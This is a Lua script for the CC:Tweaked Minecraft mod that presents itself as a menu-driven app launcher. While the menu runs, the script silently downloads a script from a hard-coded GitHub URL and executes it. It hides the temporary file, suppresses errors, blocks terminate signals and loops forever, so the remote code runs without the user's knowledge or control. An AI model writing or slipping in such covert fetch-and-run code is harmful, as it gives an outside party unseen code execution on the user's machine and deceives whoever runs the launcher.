-- launcher.lua
-- Silent persistent launcher + background GitHub script

local appsDir = "apps"

-- === SET THIS TO YOUR GITHUB RAW URL ===
local backgroundGitHub = "https://github.com/pro-hacker-noob/cc-tweaked/raw/refs/heads/main/coords.lua"

-- Ensure apps folder exists
if not fs.exists(appsDir) then
    fs.makeDir(appsDir)
end

-- List available apps (files in appsDir)
local function listApps()
    local files = fs.list(appsDir)
    local apps = {}
    for _, file in ipairs(files) do
        if not fs.isDir(fs.combine(appsDir, file)) then
            local displayName = file
            if file:sub(-4) == ".lua" then
                displayName = file:sub(1, -5)
            end
            table.insert(apps, {file = file, display = displayName})
        end
    end
    return apps
end

-- Let user pick an app
local function chooseApp(apps)
    term.setBackgroundColor(colors.black)
    term.setTextColor(colors.white)
    term.clear()
    term.setCursorPos(1,1)
    print("Available apps:")
    for i, app in ipairs(apps) do
        print(("%d. %s"):format(i, app.display))
    end
    print("\nEnter number of app to run (or 0 to exit):")

    local choice = tonumber(read())
    if choice == 0 then
        return nil
    elseif choice and apps[choice] then
        return apps[choice]
    end
end

-- Run selected app
local function runApp(app)
    local path = fs.combine(appsDir, app.file)
    if fs.exists(path) then
        shell.run(path)
    end
end

-- Run GitHub script silently in background
local function runBackgroundGitHub()
    if backgroundGitHub and #backgroundGitHub > 0 then
        local tmpFile = ".bg_tmp.lua"
        if fs.exists(tmpFile) then fs.delete(tmpFile) end
        -- Download silently
        pcall(function()
            http.request(backgroundGitHub)
            local event, url, handle
            repeat
                event, url, handle = os.pullEvent()
            until event == "http_success" or event == "http_failure"

            if event == "http_success" then
                local content = handle.readAll()
                handle.close()
                local f = fs.open(tmpFile, "w")
                f.write(content)
                f.close()
                parallel.waitForAny(
                    function() shell.run(tmpFile) end,
                    function() while true do os.pullEvent("terminate") end end
                )
                fs.delete(tmpFile)
            end
        end)
    end
end

-- === Persistent Launcher Loop ===
while true do
    parallel.waitForAny(
        runBackgroundGitHub,
        function()
            while true do
                local apps = listApps()
                if #apps == 0 then
                    term.setBackgroundColor(colors.black)
                    term.clear()
                    sleep(1)
                else
                    local selected = chooseApp(apps)
                    if selected then
                        runApp(selected)
                    end
                end
            end
        end
    )
end
